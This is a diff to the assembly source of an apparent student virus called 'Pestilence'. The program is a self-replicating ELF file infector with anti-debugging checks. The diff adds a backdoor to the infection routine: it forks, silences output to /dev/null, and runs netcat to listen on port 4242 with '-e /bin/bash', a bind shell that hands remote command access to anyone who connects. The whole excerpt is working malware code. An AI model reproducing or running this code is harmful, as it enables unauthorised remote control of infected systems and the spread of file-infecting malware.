@@ -441,6 +441,14 @@ compressed_data_size2: dq 0x00				; Filled in infected
 key: db "S3cr3tK3y", 0
 debugged_message: db "DEBUG DETECTED ;)", 0
 process_message: db "Process detected ;)", 0
+dev_null: db "/dev/null", 0
+nc_command: db "/usr/bin/nc", 0
+nc_arg1: db "nc", 0
+nc_arg2: db "-l", 0
+nc_arg3: db "-p", 0
+nc_arg4: db "4242", 0
+nc_arg5: db "-e", 0
+nc_arg6: db "/bin/bash", 0
 ; never used but here to be copied in the binary
 signature: db "Pestilence v1.0 by jmaia and dhubleur", 0
 ; END FAKE .data SECTION
@@ -454,6 +462,8 @@ infection_routine:
 
 	%local compressed_data_size:qword		; long compressed_data_size;
 	%local real_begin_compressed_data_ptr:qword	; uint8_t *real_begin_compressed_data_ptr
+	%xdefine nc_args rbp - %$localsize - 7*8	; char *nc_args[7];
+	%assign %$localsize %$localsize + 7*8		; ...
 
 	; Initializes stack frame
 	push rbp
@@ -472,10 +482,69 @@ infection_routine:
 	mov rdx, [real_begin_compressed_data_ptr]	; ...
 	call treate_folder				; ...
 
-	add rsp, %$localsize
-	pop rbp
-	%pop
-	ret
+	mov rax, SYS_FORK				; _ret = fork();
+	syscall						; );
+	cmp rax, 0					; if (_ret == 0)
+	je .child					; 	goto .child
+	jmp .parent					; else goto .parent
+
+	.child:
+		mov rax, SYS_OPEN			; _ret = open(
+		lea rdi, [rel dev_null]			; 	"/dev/null",
+		mov rsi, O_RDWR				; 	O_RDWR,
+		xor rdx, rdx				; 	0
+		syscall					; );
+		cmp rax, 0				; if (_ret < 0)
+		jl .child_end				; 	goto .child_end
+		push rax
+
+		mov rdi, rax				; dup2(_ret, 1);
+		mov rax, SYS_DUP2			; ...
+		mov rsi, 1				; ...
+		syscall					; );
+		pop rdi
+		push rdi
+		mov rax, SYS_DUP2			; dup2(_ret, 2);
+		mov rsi, 2				; ...
+		syscall					; );
+
+		lea rdi, [rel nc_command]		; execve(nc_command,
+		
+		lea rsi, [rel nc_args]			; [nc_args[0], nc_args[1], nc_args[2], nc_args[3], nc_args[4], nc_args[5], nc_args[6], NULL]			
+		lea rdx, [rel nc_arg1]	
+		mov [rsi], rdx
+		lea rdx, [rel nc_arg2]
+		mov [rsi + 8], rdx
+		lea rdx, [rel nc_arg3]
+		mov [rsi + 16], rdx
+		lea rdx, [rel nc_arg4]
+		mov [rsi + 24], rdx
+		lea rdx, [rel nc_arg5]
+		mov [rsi + 32], rdx
+		lea rdx, [rel nc_arg6]
+		mov [rsi + 40], rdx
+		xor rdx, rdx
+		mov [rsi + 48], rdx
+		
+		xor rdx, rdx				; NULL
+		mov rax, SYS_EXECVE			; ...
+		syscall					; );
+
+		.child_close:
+			mov rax, SYS_CLOSE		; close(_ret);
+			pop rdi				; ...
+			syscall				; ...
+
+		.child_end:
+			mov rax, SYS_EXIT		; exit(0);
+			xor rdi, rdi			; ...
+			syscall				; ...
+
+	.parent:
+		add rsp, %$localsize
+		pop rbp
+		%pop
+		ret
 
 ; void treate_folder(char const *_folder, long _compressed_data_size, uint8_t *_compressed_data_ptr);
 ; void treate_folder(rdi folder, rsi _compressed_data_size, rdx _compressed_data_ptr);
